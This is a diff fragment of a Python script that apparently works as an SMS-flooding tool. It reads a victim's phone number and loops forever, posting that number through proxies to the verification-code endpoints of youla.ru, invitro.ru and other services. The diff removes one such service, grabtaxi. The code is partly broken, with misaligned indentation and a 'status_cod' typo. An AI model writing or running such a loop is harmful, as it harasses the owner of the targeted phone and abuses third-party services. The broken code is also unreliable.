@@ -52,11 +52,6 @@ except Exception:
 a = input('Enter Number With + : ')
 b = 30
 class services():
-    # service number 0
-    def service0(self, a, proxies):
-    r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
-            data = {"phoneNumber":a}, proxies=proxies)
-        print('grabtaxi.com' + str(r.status_code))
 	# service number 1
 	def service1(self, a, proxies):
 		r = requests.post('https://youla.ru/web-api/auth/request_code',
@@ -248,8 +243,6 @@ class services():
 		r = requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': a})
 		print('invitro.ru ' + str(r.status_cod))
 while 1:
-    services().service0(a,proxies)
-    sleep(b)
 	services().service1(a,proxies)
 	sleep(b)
 	services().service2(a,proxies)
